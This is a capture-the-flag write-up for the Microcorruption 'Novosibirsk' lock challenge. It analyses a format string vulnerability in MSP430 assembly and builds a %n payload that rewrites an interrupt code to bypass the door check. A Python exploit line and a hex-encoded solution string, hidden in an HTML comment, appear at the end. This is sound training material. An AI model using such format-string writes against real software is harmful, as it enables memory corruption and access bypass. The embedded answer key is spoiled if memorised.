# Novosibirsk
> partial source code is [here](./dump.asm)  
> **Vulnerability**: Format String Vulnerability  
> similar to [Addis Ababa](../AddisAbaba/readme.md)

## Analysis
> similar to [Addis Ababa](../AddisAbaba/readme.md), both program both pass the user input directly the first argument of `printf`  
> Therefore, both vulnerable to **Format String Vulnerability**

### What is different from [Addis Ababa](../AddisAbaba)?
**Addis Ababa** relies on that the `printf` with vulnerability is called after the `test_password_valid` and will be able to use it overwrite the value set and used for checking.

However, `Novosibirsk` calls `printf` with vulnerability before the `conditional_unlock_door`, which is use for both checking the username and unlocking the door. That is, even if the `printf` is able to set the value used for checking, it will be overwritten by the value set by `conditional_unlock_door` and would not affect the behavior of the function.

### Thoughts
#### Overwrite return value?
With the setup of the program, shown below:
```asm
4424 <__do_clear_bss>
4424:  3f40 1400      mov	#0x14, r15
4428:  0f93           tst	r15
442a:  0624           jz	$+0xe <main+0x0>
```

The program will **jump** to `main` and not **call** it. Therefore, the return address will not be pushed to the stack and we cannot overwrite it to control the program flow.

#### Overwrite the call for `INT 0x7e(arg1)` to `INT 0x7f(void)` in `<conditional_unlock_door>`?

What do the program do and how can this be helpful?
- `<main>`
    ```c
    void main() {
        ...
        printf(input);
        if (conditional_unlock_door(input)) {
            printf("Access granted.");
        } else {
            printf("That username is not valid.")
        }
    }
    ```
- `<conditional_unlock_door>`
    ```c
    int conditional_unlock_door(char *username) {
        bool result;
        INT(0x7e, username, &result);
        return (int)result;
    }
    ```

Therefore, no matter what the input is, the program will always call `<conditional_unlock_door>` with the input and check the return value, and at the same time, there is no other checking mechanism other than the **interupt**, `INT 0x7e`.

That is, if we can overwrite the call for `INT 0x7e(arg1)` to `INT 0x7f(void)` in `<conditional_unlock_door>`, then we can bypass the check in the interrupt and unlock the door.

##### Where to modify?
```asm
44b0 <conditional_unlock_door>
44b0:  0412           push	r4
44b2:  0441           mov	sp, r4
44b4:  2453           incd	r4
44b6:  2183           decd	sp
44b8:  c443 fcff      mov.b	#0x0, -0x4(r4)
44bc:  3e40 fcff      mov	#0xfffc, r14
44c0:  0e54           add	r4, r14
44c2:  0e12           push	r14
44c4:  0f12           push	r15
44c6:  3012 7e00      push	#0x7e
44ca:  b012 3645      call	#0x4536 <INT>
44ce:  5f44 fcff      mov.b	-0x4(r4), r15
44d2:  8f11           sxt	r15
44d4:  3152           add	#0x8, sp
44d6:  3441           pop	r4
44d8:  3041           ret
```

At `0x44c6`, the program pushes `0x7e` to the stack and calls `INT`. Therefore, if we can overwrite the value at `0x44c8` to `0x7f`, then the program will call `INT 0x7f` instead of `INT 0x7e`. As shown below:

```diff
44c4:  0f12           push	r15
- 44c6:  3012 7e00      push	#0x7e
+ 44c6:  3012 7f00      push	#0x7f
44ca:  b012 3645      call	#0x4536 <INT>
```

##### Stack Layout (when `printf(input)` is called)
| address | stack | `printf` arguments | data                                           |
| :-----: | :---: | :----------------: | :--------------------------------------------- |
|   ...   |  ...  |         -          | ...                                            |
|  420a   |  sp   |    1st argument    | pointer to input, `0x420c`                     |
|  420c   | sp+2  |    2nd argument    | input[0] = address for the to be modified byte |
|  420e   | sp+4  |    3rd argument    | input[2]                                       |
|  4210   | sp+6  |    4th argument    | input[4]                                       |
|   ...   |  ...  |        ...         | ...                                            |
|   ...   |  ...  |        ...         | input[??] = "%n"                               |
|   ...   |  ...  |        ...         | ...                                            |

Therefore, the first 2 bytes of the input should be `0x44c8` in little endian to modify the as mentioned [above](#where-to-modify).

**But**, how many padding needed before "%n" to set the value to `0x7f`?

From the [manual](https://microcorruption.com/public/manual.pdf), "%n" will write the number of characters printed thus far to the address specified so we need total of `0x7f` bytes of padding, including the address of the byte to be modified. That is, the input should be as follows:
|   `input`   | content  | reasoning                                                                         |
| :---------: | :------: | :-------------------------------------------------------------------------------- |
|  input[0]   | `0x44c8` | address of the byte to be modified                                                |
|  input[2]   |    -     | (padding)                                                                         |
|  input[4]   |    -     | (padding)                                                                         |
|     ...     |   ...    | (padding)                                                                         |
| input[0x76] |    -     | (padding)                                                                         |
| input[0x7f] |   `%n`   | write the number of characters, `0x7f`, printed thus far to the address specified |

## Exploit
```python
p16(0x44c8).ljust(0x7f, b'A') + b'%n'
```

<!-- solution: {'level_id': 13, 'input': 'c8444141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141256e;'} -->
